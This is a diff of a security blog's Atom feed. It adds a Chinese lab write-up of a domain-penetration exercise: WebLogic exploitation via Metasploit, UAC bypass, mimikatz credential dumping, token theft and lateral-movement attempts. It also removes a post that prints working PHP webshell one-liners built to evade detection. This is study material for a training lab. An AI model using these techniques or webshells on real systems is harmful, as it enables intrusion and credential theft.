@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-06-29T02:55:07.585Z</updated>
+    <updated>2020-07-06T06:26:04.813Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -10,6 +10,309 @@
     <logo>https://chriskalix.github.io/images/avatar.png</logo>
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[域渗透靶机实战(一)]]></title>
+        <id>https://chriskalix.github.io/post/-iDU1AvVp/</id>
+        <link href="https://chriskalix.github.io/post/-iDU1AvVp/">
+        </link>
+        <updated>2020-07-01T02:27:34.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>标题是（一），其实是红日的靶机2，前段时间学习了域的基础后最近开始做靶机，逐步提升吧，希望有不足的地方大家能帮我指出，谢谢</p>
+</blockquote>
+<h2 id="0x01-环境配置">0x01 环境配置</h2>
+<h3 id="1-环境搭建">1. 环境搭建</h3>
+<p>从<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">这里</a>下载靶机环境，配置两个hostonly网卡分别为10.10.10.0/24，以及192.168.111.1/24网段</p>
+<h3 id="2-环境一览">2. 环境一览</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">名称</th>
+<th style="text-align:center">内网地址</th>
+<th style="text-align:center">外网地址</th>
+<th style="text-align:center">系统</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">DC</td>
+<td style="text-align:center">10.10.10.10.</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">Windows 2012(64位)</td>
+</tr>
+<tr>
+<td style="text-align:center">WEB</td>
+<td style="text-align:center">10.10.10.80</td>
+<td style="text-align:center">192.168.111.80</td>
+<td style="text-align:center">Windows 2008(64位)</td>
+</tr>
+<tr>
+<td style="text-align:center">PC</td>
+<td style="text-align:center">10.10.10.201</td>
+<td style="text-align:center">192.168.111.201</td>
+<td style="text-align:center">Windows 7(32位)</td>
+</tr>
+<tr>
+<td style="text-align:center">Kali(自建)</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">192.168.111.x</td>
+<td style="text-align:center">Kali Linux 2020.2</td>
+</tr>
+</tbody>
+</table>
+<p>[*] 注：在主机 <code>WEB</code> 起来后，要手动起 <code>Weblogic</code> 服务</p>
+<h2 id="0x02-实战开始">0x02 实战开始</h2>
+<blockquote>
+<p>在做的时候要当成黑盒，这样做起来比较有逻辑</p>
+</blockquote>
+<h3 id="1-外部突破">1. 外部突破</h3>
+<h4 id="常规扫描">常规扫描</h4>
+<p><code>nmap 192.168.111.1/24 -sS -p 1-65535 -T4</code> 对C段下进行初步发现，扫描结果如下：</p>
+<pre><code>Nmap scan report for 192.168.111.80
+Host is up (0.0014s latency).
+Not shown: 65522 filtered ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+1433/tcp  open  ms-sql-s
+3389/tcp  open  ms-wbt-server
+7001/tcp  open  afs3-callback
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49183/tcp open  unknown
+49190/tcp open  unknown
+60966/tcp open  unknown
+MAC Address: 00:0C:29:91:56:77 (VMware)
+
+Nmap scan report for 192.168.111.201
+Host is up (0.0080s latency).
+Not shown: 65526 filtered ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+MAC Address: 00:0C:29:32:32:CD (VMware)
+</code></pre>
+<p>其中80机器对外开放80端口，觉得比较有可能为入口点。使用dirsearch扫描目录，无果。其余开放的1433，3389，445等常规端口，可以尝试口令、或者CVE直接打一下试试。<br>
+这时访问7001端口，发现为web应用。想起了熟悉的weblogic，于是用dirsearch再遍历一下，发现/console目录，访问。<br>
+<img src="https://chriskalix.github.io/post-images/1594016543093.png" alt="" loading="lazy"><br>
+果然是weblogic，版本为10.3.6.0</p>
+<h4 id="权限获取">权限获取</h4>
+<p>这里用 <code>rabbitmask</code> 师傅的 <code>weblogicscan</code> 扫一发。存在<code>cve-2019-2725</code>以及<code>cve-2019-2727</code>。我就直接用 <code>msf</code> 上的cve-2019-2725试了一下，得到了初步权限<br>
+这里还是比较简单的<br>
+<img src="https://chriskalix.github.io/post-images/1594016548948.png" alt="" loading="lazy"></p>
+<h3 id="2-本机信息获取">2. 本机信息获取</h3>
+<blockquote>
+<p>亮神：渗透测试的本质就是信息收集</p>
+</blockquote>
+<p><code>shell</code>进入靶机，输入 <code>chcp 65001</code> 修改乱码显示。整理后信息如下，其实信息获取还不够完善，例如防火墙策略等等，可以参考腾讯蓝军的文章：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">信息</th>
+<th style="text-align:center">详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">主机名</td>
+<td style="text-align:center">WEB</td>
+</tr>
+<tr>
+<td style="text-align:center">主机版本</td>
+<td style="text-align:center">Windows Server 2008 R2</td>
+</tr>
+<tr>
+<td style="text-align:center">域名称</td>
+<td style="text-align:center">de1ay.com</td>
+</tr>
+<tr>
+<td style="text-align:center">内网IP</td>
+<td style="text-align:center">10.10.10.80</td>
+</tr>
+<tr>
+<td style="text-align:center">防护软件</td>
+<td style="text-align:center">360</td>
+</tr>
+<tr>
+<td style="text-align:center">权限</td>
+<td style="text-align:center">Administrator</td>
+</tr>
+</tbody>
+</table>
+<p>执行<code>net time /domain</code> 报错5，代表有域，但是当前不是域用户</p>
+<h4 id="端口开放">端口开放</h4>
+<pre><code>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       736
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1472
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2228
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       400
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       784
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:49183          0.0.0.0:0              LISTENING       512
+  TCP    0.0.0.0:49190          0.0.0.0:0              LISTENING       488
+  TCP    0.0.0.0:60966          0.0.0.0:0              LISTENING       1472
+  TCP    10.10.10.80:139        0.0.0.0:0              LISTENING       4
+  TCP    10.10.10.80:7001       0.0.0.0:0              LISTENING       3264
+  TCP    127.0.0.1:7001         0.0.0.0:0              LISTENING       3264
+  TCP    192.168.111.80:139     0.0.0.0:0              LISTENING       4
+  TCP    192.168.111.80:7001    0.0.0.0:0              LISTENING       3264
+  TCP    192.168.111.80:49399   192.168.111.128:4444   ESTABLISHED     1088
+</code></pre>
+<h4 id="进程信息">进程信息</h4>
+<p><img src="https://chriskalix.github.io/post-images/1594016561684.png" alt="" loading="lazy"><br>
+主机上运行着360</p>
+<h3 id="3-权限提升">3. 权限提升</h3>
+<blockquote>
+<p>这里看的也少，有基础的知识点没有覆盖，于是摘抄一些作为记录</p>
+</blockquote>
+<h4 id="windows提权方法">windows提权方法</h4>
+<p>这里有Wing仔在先知上的翻译<a href="https://xz.aliyun.com/t/2519">文章</a>，很详细，我就不搬运了。自己目前知道的比较狭窄，如下：</p>
+<ul>
+<li>本地提权漏洞，如ms15_051</li>
+<li><strong>Bypassuac</strong>（对windows 7、8以上getsystem均需要bypass）</li>
+<li>令牌窃取</li>
+<li>HASH（有密码当然可以...）</li>
+</ul>
+<h4 id="补丁获取">补丁获取</h4>
+<p>上主机，运行 <code>systeminfo</code> ，补丁如下：</p>
+<pre><code class="language-txt">[01]: KB2999226
+[02]: KB958488
+[03]: KB976902
+</code></pre>
+<p>一般情况下...会是比较多的补丁吧，这时候可以到<a href="https://bugs.hacking8.com/tiquan/">提权辅助网页</a>进行搜索（类似于在线的exploit_suggester :） ）</p>
+<h4 id="漏洞尝试">漏洞尝试</h4>
+<p>补丁很少，感觉随便抓一个就能打，于是先用<code>post/multi/recon/local_exploit_suggester</code> 看一看，结果如下：<br>
+<img src="https://chriskalix.github.io/post-images/1594016571241.png" alt="" loading="lazy"><br>
+用 <code>ms15_051</code> 进行尝试<br>
+<img src="https://chriskalix.github.io/post-images/1594016576216.png" alt="" loading="lazy"><br>
+...竟然失败了，误以为payload设置错误，来回尝试均无果。这时候怀疑可能是360拦截，这时候看到了别WP，说可能是 UAC 的问题(虽然我不知道怎么看的，因为我好像没有弹框...)。<br>
+UAC的知识点没有看过，这次靶机遇到了，稍微补习一下（毕竟是笔记嘛~熟悉的朋友们可以跳过这个部分）</p>
+<h5 id="额外补充-uac">额外补充-UAC</h5>
+<h6 id="uac简介">UAC简介</h6>
+<p>UAC(User Account Control)即用户账户控制，是在Windows Vista以及更高版本上采用的一种控制机制。其原理是通过通知用户是否对应用程序使用硬盘驱动器和系统文件授权(平时熟悉的弹框)，以达到帮助阻止恶意程序损坏系统的效果 -- 摘抄</p>
+<h6 id="bypassuac">bypassuac</h6>
+<p>从这篇<a href="https://www.cnblogs.com/Chesky/p/UAC_Bypass.html">文章</a>里摘抄出了 bypassuac 的常见方法，其实在小y师傅的<a href="https://github.com/xiaoy-sec/Pentest_Note">Pentest_Note</a>里也记录了许多</p>
+<ul>
+<li>白名单提权机制</li>
+<li>DLL劫持</li>
+<li>Windows自身提权漏洞</li>
+<li>远程注入</li>
+<li>COM接口技术</li>
+</ul>
+<h6 id="msf">MSF</h6>
+<blockquote>
+<p>从内网安全攻防摘抄了部分</p>
+</blockquote>
+<p>运行 <code>exploit/windows/local/bypassuac</code> ，获得了新的 <code>session</code> ，在新的 <code>session</code> 中getsystem获取权限。</p>
+<p>[*] 注1：bypassuac模块会产生多个文件，容易被杀软识别。使用 bypassuac_injection 模块直接运行在内存的反射DLL中，不会接触到目标机器硬盘，降低了被检测出的概率<br>
+[*] 注2：bypassuac的前提为，当前用户必须在管理员组中（该靶机在管理员组），且UAC为默认配置（仅在程序试图修改我的计算机时通知我）</p>
+<h4 id="权限获取-2">权限获取</h4>
+<p>其实在刚刚的 <code>local_exploit_sugguester</code> 中就展示了一个方法 <code>bypassuac_eventvwr</code> ，其实用 <code>bypassuac</code> 也能成功，截图如下<br>
+<img src="https://chriskalix.github.io/post-images/1594016584867.png" alt="" loading="lazy"></p>
+<h4 id="进程迁移">进程迁移</h4>
+<blockquote>
+<p>将进程迁移至稳定的SYSTEM进程中</p>
+</blockquote>
+<p>刚开始不懂，看着教程直接迁移到了explorer.exe，没有认真看权限，结果降权了...这时候内心有个问题，进程迁移是可以迁移到任意进程嘛？ZhuDongFangYu.exe也可以作为目标嘛？<br>
+这边为了好玩，迁移到了主动防御...群里师傅推荐的是 <code>svchost.exe</code> 和 <code>csrss.exe</code> ，我查了一下大概是做啥的，记录了记录了...</p>
+<h3 id="4-凭证获取">4. 凭证获取</h3>
+<blockquote>
+<p>这里直接使用msf来做，其余的方式在博客的前面几章里有留作介绍</p>
+</blockquote>
+<h4 id="hashdump">hashdump</h4>
+<p>msf中有两种获取hash的方式，分别为<code>hashdump</code>和<code>smart_hashdump</code>。两者的区别为 hashdump仅能导出本地的hash，而smart_hashdump可以导出域用户的hash。但是目前的账户为本机<code>SYSTEM</code> 权限，并不是域用户，所以跑出的没有差别(我认为)<br>
+<img src="https://chriskalix.github.io/post-images/1594016593384.png" alt="" loading="lazy"><br>
+[*] 注：这里有一个小问题，作者的靶机其实密码都是一样的，而我在登录 WEB这台机器的时候密码不对，猜解后我重置了密码，导致和其他账户都不一样</p>
+<h4 id="明文获取">明文获取</h4>
+<p>加载mimikatz，用wdigest抓取明文，但是读取不到...<br>
+<img src="https://chriskalix.github.io/post-images/1594016599218.png" alt="" loading="lazy"><br>
+这时候纳闷了，为什么和别人说的不一样...把错误的信息复制出来，用bing去搜，发现可能是进程位数问题 - <a href="https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module">文章</a><br>
+好吧...我就不应该尝试迁移到x86进程里的，这时候重新迁移一下，到<code>csrss.exe</code> 上，重新获取<br>
+由于<code>WEB\de1ay</code>的密码被我修改过，且后续不会使用到，所以这里截取部分（在<a href="https://www.anquanke.com/post/id/193193">文章</a>中，直接在本机抓到了域管账号密码...我没有啊...不过没关系）<br>
+<img src="https://chriskalix.github.io/post-images/1594016604606.png" alt="" loading="lazy"></p>
+<h3 id="5-令牌利用失败">5. 令牌利用（失败）</h3>
+<blockquote>
+<p>当然可以尝试扫描内网，然后打CVE，SMB爆破等等...其实均可成功的~，但是作者的靶机上写到了Access Token的利用，我们还是试一试吧~（毕竟目标不是快速通关）</p>
+</blockquote>
+<p>在msf下 <code>load incognito</code> ，<code>list_tokens -u</code> 查看一下，如下：</p>
+<p><img src="https://chriskalix.github.io/post-images/1594016720508.png" alt="" loading="lazy"><br>
+这里其实有个小插曲，我看了<code>steal_token</code>这个操作，就去尝试了一下，结果这个meterpreter就好像变&quot;坏&quot;了（无法执行任何操作，均deny）...埋个坑，后续看看<br>
+通过模拟令牌，切换到 <code>DE1AY\mssql</code> 用户下<br>
+<img src="https://chriskalix.github.io/post-images/1594016727153.png" alt="" loading="lazy"><br>
+但这个时候在meterpreter里什么操作都不行了（变坏了）...可是作者的文章里明明提到了 <code>Access Token利用（MSSQL利用）</code> ...为什么会不行呢...希望指教哇...<br>
+本来我的思路是从这里切换到mssql权限，然后 <code>ms14-068</code> ，结果只能换个方法了~~</p>
+<p><strong>[*]</strong> 遗留问题：这里是为什么（这样是不是不对啊..）....</p>
+<h3 id="6-内网探测">6. 内网探测</h3>
+<blockquote>
+<p>关于信息获取的姿势有很多，腾讯前几天的<a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">文章</a>写的非常全，当然里面包括的不止是信息收集这一部分，可以当作备忘录实时翻看了</p>
+</blockquote>
+<h4 id="spn获取">SPN获取</h4>
+<p>指令 <code>setspn -T de1ay.com -Q */*</code> ，快速获取域内注册的服务，如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1594016733477.png" alt="" loading="lazy"></figure>
+<p>看到域内有DC,PC,WEB三台主机。很明显DC就是域控啦（当然，应该用别的方式加以识别，例如<code>net time /domain</code>等等...），有了域名就能快速发现域内机器的IP，也不用挂上代理慢慢扫描了...</p>
+<h4 id="主机端口探测">主机端口探测</h4>
+<p>刚才已经发现了所在的内网网段，在msf里添加上网段。<br>
+<code>run autoroute -s 10.10.10.0/24</code> ，这边可以挂上socks，然后用proxychains + nmap，或者传工具(nbtscan)等等都可以。<br>
+由于已经知道域内主机的地址（SPN扫描发现），直接用 <code>auxiliary/scanner/portscan/tcp</code> 扫一下两台主机，结果如下<br>
+<img src="https://chriskalix.github.io/post-images/1594016738827.png" alt="" loading="lazy"></p>
+<h3 id="7-漏洞尝试">7. 漏洞尝试</h3>
+<blockquote>
+<p>看到了445和3389异常兴奋...于是想照着域控先来一发</p>
+</blockquote>
+<h4 id="永恒之蓝">永恒之蓝</h4>
+<p>看到 <code>SMB</code> 第一时间想到的就是永恒之蓝，10.10.10.10 是 <code>DC</code> ，当然想法是一把梭。但是msf的模块在windows 2008以上会有问题，模块无法正常load进来，这个可以在 metasploit github上的<a href="https://github.com/rapid7/metasploit-framework/issues/13478">issue</a>里找到。<br>
+这时候打 <code>10.10.10.201</code> 那台 <code>PC</code> 也无法成功，情况未知...很是头疼。在星球里问了，换上了 <code>doublepulsar</code> ，仍然无果<br>
+这难道就没有办法了嘛~其实github上有NSA泄露的原版，可以拖上去继续尝试...为了快捷，我先尝试别的...</p>
+<h4 id="cve-2019-0708">CVE-2019-0708</h4>
+<p>先用校验模块尝试看一看<br>
+<img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2%5C14.png" alt="" loading="lazy"></p>
+<p>域控没有3389的问题，PC有问题。那么上手去打一下，这边注意因为是用的vmware起的环境，所以target要重新设定为当前vmware的版本（默认的Automatic不行），这里又头疼了...因为我的VM是15.5.6的，target里没有......</p>
+<p>做到这里有点郁闷了...因为MS17017没有成功（其实可以的，只是msf上的模块有问题），难道只有用 psexec 了嘛.</p>
+<h3 id="8-横向移动">8. 横向移动</h3>
+<p>这边其实垮掉了。上去一看环境崩坏，捣鼓半天很是痛苦，果然做靶机最最痛苦的就是环境问题。下面拉跨的给出正解文章</p>
+<ul>
+<li><a href="http://www.adminxe.com/888.html">文章1</a></li>
+<li><a href="https://www.anquanke.com/post/id/193193">文章2</a></li>
+</ul>
+<p>因为域的问题（不太清楚是因为修改了密码还是中间的误操作），导致本机上应该能抓到域管账号密码却没有了~花费了很多时间看环境的问题，还是比较痛苦的...下一步决定去看xq17表哥的文章，搭建域环境摸一遍，附上一个第一次做成功的图吧...累了累了...</p>
+<p><img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2_11.png" alt="" loading="lazy"><br>
+毕竟还是比较真实的嘛~~~</p>
+<h2 id="0x03-知识点坑点总结">0x03 知识点&amp;坑点总结</h2>
+<h3 id="1-知识点">1. 知识点</h3>
+<ul>
+<li>UAC（bypass）</li>
+<li>Access Token</li>
+<li>SPN</li>
+<li>GPP</li>
+<li>psexec | wmi</li>
+<li>hashdump (Wdigest)</li>
+</ul>
+<h3 id="2-坑点">2. 坑点</h3>
+<ul>
+<li>mimikatz抓不到</li>
+<li>进程迁移位数</li>
+<li>ms17017</li>
+<li>环境问题，十分痛苦</li>
+</ul>
+<h2 id="0x04-后续思考">0x04 后续思考</h2>
+<ol>
+<li>日志清理</li>
+<li>动作太大</li>
+<li>票据存留</li>
+</ol>
+<p>做完之后原理性的东西需要再加以总结，另外有些虎头蛇尾，还是继续看一看域环境，加深印象</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[域渗透基础知识(三)-思维导图补充]]></title>
         <id>https://chriskalix.github.io/post/3dogm6EPG/</id>
@@ -1533,55 +1836,6 @@ L方法：代表Language，用于获得语言变量</p>
 <h4 id="payload">payload</h4>
 <p>https://github.com/LoRexxar/redis-rogue-server</p>
 <p>另一<a href="https://www.t00ls.net/articles-56339.html">好文</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[PHP后门&特性记录]]></title>
-        <id>https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/</id>
-        <link href="https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/">
-        </link>
-        <updated>2020-06-14T04:24:32.000Z</updated>
-        <content type="html"><![CDATA[<blockquote>
-<p>这两天读了P牛的文章，正好群里的大佬发出了文章用到了Tricks。由于php审计还处于不成熟阶段，记录一下读后感受</p>
-</blockquote>
-<h2 id="php的特性检测">PHP的特性&amp;检测</h2>
-<p>通常的，常见的php webshell很容易被吃。前段时间处理网站被挂马，马都比较明显，要么是混淆要么是回调，这种往往是因为没有前置一个较好的webshell检测，有的话这么简单的马应该是传不上来的。<br>
-这时我问我自己，如果是我来上传马，我会怎么做？我发现我的想法也比较局限，无非就是正则执行，回调，加密混淆等等😅。此时看到P牛的文章，感觉十分神奇，记录一下</p>
-<h2 id="前置知识">前置知识</h2>
-<p>文章中提到了针对一个回调型后门，检测引擎会如何检测：</p>
-<ol>
-<li>遍历AST树</li>
-<li>分析<code>FuncCall Node</code>判断是否有回调</li>
-<li>回调是否是一个变量</li>
-</ol>
-<h2 id="函数别名">函数别名</h2>
-<p>我能想到的正则执行，在PHP7后已经被删除了。mb_ereg_replace和mb_eregi_replace这两个函数依然可以，他们的别名mbereg_replace和mbereg_ireplace也能执行任意代码。P牛演示的代码段为</p>
-<pre><code class="language-php">&lt;?php
-mbereg_replace('.*', '\0', $_REQUEST[2333], 'mer');
-</code></pre>
-<p>在PHP7.2.9的环境中报错，切换到低版本后没有问题了<br>
-上述的是一个引子，通用的方法是自己来申明函数的别名，例如</p>
-<pre><code class="language-php">&lt;?php
-use function \assert as test;
-test($_POST[2333]);
-</code></pre>
-<p>以及PHP7的</p>
-<pre><code class="language-php">&lt;?php
-$f = new class($_POST['name']) extends ReflectionFunction {};
-$f-&gt;invoke($_POST[2333]);
-</code></pre>
-<p><strong>神奇的trick</strong></p>
-<pre><code class="language-php">printf&lt;char&gt;('hello world')
-</code></pre>
-<p>其中<char>的范围是[\x00-\x20],PHP会忽略这个控制字符，也是一个绕过的tricks（PHP-Parser是无法正确解析的）</p>
-<h2 id="文章总结">文章总结</h2>
-<ol>
-<li>别名</li>
-<li>重命名</li>
-<li>参数名位置(变长参数)</li>
-<li>控制字符(重点)</li>
-<li>PHP标签</li>
-</ol>
 ]]></content>
     </entry>
 </feed>
